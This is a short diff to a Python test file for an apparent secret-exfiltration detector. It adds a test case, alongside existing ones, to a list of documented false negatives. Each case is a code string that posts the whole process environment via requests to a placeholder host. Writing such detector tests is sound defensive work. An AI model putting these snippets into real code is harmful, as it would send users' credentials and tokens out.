@@ -1221,6 +1221,9 @@ def test_python_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
         "import os\nimport requests\n\nsession = requests.Session()\nout = {}\nout[session.post(host, json=dict(os.environ))] = 1\n",
         # Annotation evaluation varies by scope, future flags, and Python version, so it is skipped.
         "import os\nimport requests\n\nsession = requests.Session()\ndef annotated(value: session.post(host, json=dict(os.environ))):\n    pass\n",
+        # Tuple unpacking binds the handle through a multi-target assignment, which is outside the
+        # simple-name binding the one-level evidence chain follows (PR #4644 review; issue #4296).
+        "import os\nimport requests\n\ns, other = requests.Session(), 1\ns.post(host, json=dict(os.environ))\n",
     ],
 )
 def test_python_declared_false_negatives_stay_unreported(tmp_path: Path, source: str) -> None:
